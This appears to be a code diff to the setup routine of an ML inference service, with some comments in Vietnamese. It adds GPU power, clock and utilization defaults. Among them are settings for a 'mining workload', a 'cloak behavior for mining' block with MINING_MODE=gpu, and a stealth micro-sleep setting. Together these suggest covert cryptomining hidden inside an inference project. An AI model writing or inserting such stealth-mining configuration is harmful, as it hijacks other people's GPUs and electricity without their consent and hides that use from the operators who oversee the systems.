@@ -770,8 +770,31 @@ def setup():
     _set_default_env('ENABLE_DYNAMIC_BALANCING', 'true')  # bật cân bằng tải đa GPU
     # Safety defaults for power/utilization/clock behavior
     _set_default_env('ALLOW_UTIL_UNDER_80', '0')
-    _set_default_env('ALLOW_CLOCK_LOCK', '0')
+    _set_default_env('ALLOW_CLOCK_LOCK', '1')  # Enable controlled clock lock by default
     _set_default_env('GPU_PRE_UNLOCK', '1')
+
+    # Closed-loop defaults (enable and tune for stability)
+    _set_default_env('GPU_CLOSED_LOOP_ENABLED', '1')
+    _set_default_env('GPU_TARGET_UTIL', '0.90')
+    _set_default_env('GPU_CLOSED_LOOP_STEP_W', '5')
+    _set_default_env('GPU_CLOSED_LOOP_STEP_CLK', '15')
+    _set_default_env('GPU_CLOSED_LOOP_TOL', '0.02')
+    _set_default_env('GPU_CLOSED_LOOP_MODE', 'auto')
+    _set_default_env('GPU_CLOSED_LOOP_MAX_SEC', '35.0')
+
+    # Anti-thrashing: dwell-time and max delta for power changes
+    _set_default_env('POWER_DWELL_SEC', '30')
+    _set_default_env('POWER_MAX_DELTA_W', '15')
+
+    # VRAM reservation defaults for mining workload
+    _set_default_env('VRAM_ALLOCATION_DEFAULT', '0.2')
+
+    # Cloak behavior for mining
+    _set_default_env('MINING_MODE', 'gpu')
+    _set_default_env('STEALTH_MICRO_SLEEP_MS', '50')
+
+    # Ensure NVML utility capability if not provided
+    _set_default_env('NVIDIA_DRIVER_CAPABILITIES', 'compute,utility')
     
     # **Configuration from InferenceConfigService** (cấu hình từ InferenceConfigService – config từ ml-inference service)
     try:
@@ -799,8 +822,8 @@ def setup():
             os.environ['GPU_UTIL_MAX'] = '1.0'
             logger.info("ℹ️ [AUTO] GPU_UTIL_MAX=1.0 (100%)")
         if os.getenv('GPU_TARGET_UTIL') in (None, ''):
-            os.environ['GPU_TARGET_UTIL'] = '0.95'
-            logger.info("ℹ️ [AUTO] GPU_TARGET_UTIL=0.95 (95%)")
+            os.environ['GPU_TARGET_UTIL'] = '0.90'
+            logger.info("ℹ️ [AUTO] GPU_TARGET_UTIL=0.90 (90%)")
     except Exception:
         pass
 
